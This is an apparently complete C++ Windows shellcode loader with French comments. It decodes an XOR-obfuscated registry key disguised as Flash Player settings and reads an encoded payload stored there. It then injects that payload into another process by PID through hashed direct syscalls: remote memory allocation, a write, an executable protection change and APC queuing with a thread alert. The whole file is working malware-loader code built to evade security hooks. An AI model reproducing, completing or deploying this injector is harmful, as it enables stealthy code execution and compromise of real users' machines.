#include <Windows.h>
#include <TlHelp32.h>
#include <winreg.h>
#include <cstdio>
#include <cstdlib>
#include "syscalls.h"

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")

#define STR_MASK   0x5D
#define BLOB_MASK  0x6B

#define DBG(...) printf(__VA_ARGS__)

static const unsigned char s_path[] = {
    0x0E,0x32,0x3B,0x29,0x2A,0x3C,0x2F,0x38,0x01,0x01,
    0x10,0x3C,0x3E,0x2F,0x32,0x30,0x38,0x39,0x34,0x3C,
    0x01,0x01,0x1B,0x31,0x3C,0x2E,0x35,0x0D,0x31,0x3C,
    0x24,0x38,0x2F, 0x00
};
static const unsigned char s_val[] = {
    0x1E,0x32,0x33,0x3B,0x34,0x3A, 0x00
};

// Vérification : doit matcher les valeurs hardcodées dans syscalls-asm.x64.asm
static DWORD HashOf(const char* n) {
    DWORD h = 0x757469BF;
    for (DWORD i = 0; n[i]; i++) {
        WORD p = *(WORD*)((ULONG_PTR)n + i);
        h ^= p + ((h >> 8) | (h << 24));
    }
    return h;
}

static void UnmaskStr(const unsigned char* src, char* dst) {
    while (*src) *dst++ = (char)(*src++ ^ STR_MASK);
    *dst = '\0';
}

static DWORD LocateTargetThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { DBG("[-] Snap fail\n"); return 0; }
    THREADENTRY32 te; ZeroMemory(&te, sizeof(te)); te.dwSize = sizeof(te);
    DWORD found = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) { found = te.th32ThreadID; break; }
            te.dwSize = sizeof(te);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return found;
}

static unsigned char* FetchBlob(SIZE_T* outLen) {
    *outLen = 0;
    char keyPath[64] = {0}, keyVal[16] = {0};
    UnmaskStr(s_path, keyPath);
    UnmaskStr(s_val, keyVal);
    DBG("[*] Key path = %s\\%s\n", keyPath, keyVal);

    HKEY hk = NULL;
    LSTATUS ls = RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hk);
    if (ls != ERROR_SUCCESS) { DBG("[-] RegOpenKeyExA = %ld\n", ls); return NULL; }

    DWORD sz = 0;
    ls = RegQueryValueExA(hk, keyVal, NULL, NULL, NULL, &sz);
    if (ls != ERROR_SUCCESS || sz == 0) { DBG("[-] RegQuery size = %ld\n", ls); RegCloseKey(hk); return NULL; }

    unsigned char* buf = (unsigned char*)malloc(sz);
    if (!buf) { RegCloseKey(hk); return NULL; }
    ls = RegQueryValueExA(hk, keyVal, NULL, NULL, buf, &sz);
    RegCloseKey(hk);
    if (ls != ERROR_SUCCESS) { DBG("[-] RegQuery data = %ld\n", ls); free(buf); return NULL; }

    DBG("[+] Payload lue: %lu octets\n", sz);
    for (DWORD i = 0; i < sz; ++i) buf[i] ^= BLOB_MASK;
    DBG("[+] Premier octet decode: 0x%02X\n", buf[0]);
    *outLen = sz;
    return buf;
}

int main(int argc, char* argv[]) {
    // --- Vérif hashs (à supprimer une fois validé) ---------------------------
    DBG("[*] Hash(ZwQueueApcThread) calc = 0x%08lX (asm = 0xBCAE3B8D) %s\n",
        HashOf("ZwQueueApcThread"),
        HashOf("ZwQueueApcThread") == 0xBCAE3B8D ? "OK" : "MISMATCH!!");
    DBG("[*] Hash(ZwAlertThread)   calc = 0x%08lX (asm = 0x399EF53E) %s\n",
        HashOf("ZwAlertThread"),
        HashOf("ZwAlertThread") == 0x399EF53E ? "OK" : "MISMATCH!!");
    // ------------------------------------------------------------------------

    DBG("[*] PID cible: %s\n", argc >= 2 ? argv[1] : "(aucun)");
    if (argc < 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = (DWORD)atoi(argv[1]);

    SIZE_T blobLen = 0;
    unsigned char* blob = FetchBlob(&blobLen);
    if (!blob || blobLen == 0) { DBG("[-] FetchBlob fail\n"); return 1; }

    HANDLE hProc = NULL, hThr = NULL;
    PVOID  rBuf  = NULL;
    SIZE_T written = 0;
    ULONG  oldProt = 0;

    // Buffer final = prologue d'alignement (8 o) + shellcode
    // Prologue : and rsp, -0x10 ; sub rsp, 8
    //   -> force RSP % 16 == 8 à l'entrée du shellcode (ABI MSVC).
    //   L'APC du kernel arrive avec RSP % 16 == 0 ; sans ce fix, les
    //   shellcodes compilés "sub rsp, 0x28 ; call MessageBoxW" crashent.
    static const unsigned char s_align[8] = {
        0x48, 0x83, 0xE4, 0xF0,   // and rsp, -0x10
        0x48, 0x83, 0xEC, 0x08    // sub rsp, 8
    };
    SIZE_T totalLen = 8 + blobLen;
    SIZE_T region = totalLen;

    unsigned char* payload = (unsigned char*)malloc(totalLen);
    if (!payload) { SecureZeroMemory(blob, blobLen); free(blob); return 1; }
    memcpy(payload, s_align, 8);
    memcpy(payload + 8, blob, blobLen);
    SecureZeroMemory(blob, blobLen); free(blob); blob = NULL;

    CLIENT_ID cid; ZeroMemory(&cid, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    NTSTATUS st = Qn3_NtOpenProcess(
        &hProc,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa, &cid);
    DBG("[*] NtOpenProcess = 0x%08lX, handle=%p\n", st, hProc);
    if (st != 0 || !hProc) goto cleanup;

    DWORD tid = LocateTargetThread(pid);
    DBG("[*] TID = %lu\n", tid);
    if (tid == 0) goto cleanup;
    cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

    // THREAD_SET_CONTEXT requis par NtQueueApcThread.
    // THREAD_SUSPEND_RESUME au cas où, pour compat.
    st = Qn3_NtOpenThread(&hThr,
        THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT,
        &oa, &cid);
    DBG("[*] NtOpenThread = 0x%08lX, handle=%p\n", st, hThr);
    if (st != 0 || !hThr) goto cleanup;

    st = Qn3_NtAllocateVirtualMemory(hProc, &rBuf, 0, &region,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DBG("[*] NtAllocate = 0x%08lX, addr=%p (taille=%zu)\n", st, rBuf, region);
    if (st != 0 || !rBuf) goto cleanup;

    st = Qn3_NtWriteVirtualMemory(hProc, rBuf, payload, totalLen, &written);
    DBG("[*] NtWrite = 0x%08lX, ecrit=%zu\n", st, written);
    SecureZeroMemory(payload, totalLen); free(payload); payload = NULL;
    if (st != 0) goto cleanup;

    st = Qn3_NtProtectVirtualMemory(hProc, &rBuf, &region, PAGE_EXECUTE_READ, &oldProt);
    DBG("[*] NtProtect = 0x%08lX, old=0x%lX\n", st, oldProt);
    if (st != 0) goto cleanup;

    // ========================================================================
    // APC INJECTION
    // Le kernel exécute rBuf au prochain wait alertable du thread.
    // Pas de modification de contexte. Pas de dépendance au réveil manuel.
    // ========================================================================
    st = Qn3_NtQueueApcThread(hThr, (PVOID)rBuf, NULL, NULL, NULL);
    DBG("[*] NtQueueApcThread = 0x%08lX\n", st);
    if (st != 0) goto cleanup;

    // Force le thread à traiter les APCs en attente (utile si thread endormi).
    st = Qn3_NtAlertThread(hThr);
    DBG("[*] NtAlertThread = 0x%08lX\n", st);

    DBG("[+] APC en file. Shellcode s'executera au prochain wait alertable.\n");

cleanup:
    if (payload) { SecureZeroMemory(payload, totalLen); free(payload); }
    if (hThr)  Qn3_NtClose(hThr);
    if (hProc) Qn3_NtClose(hProc);
    return 0;
}
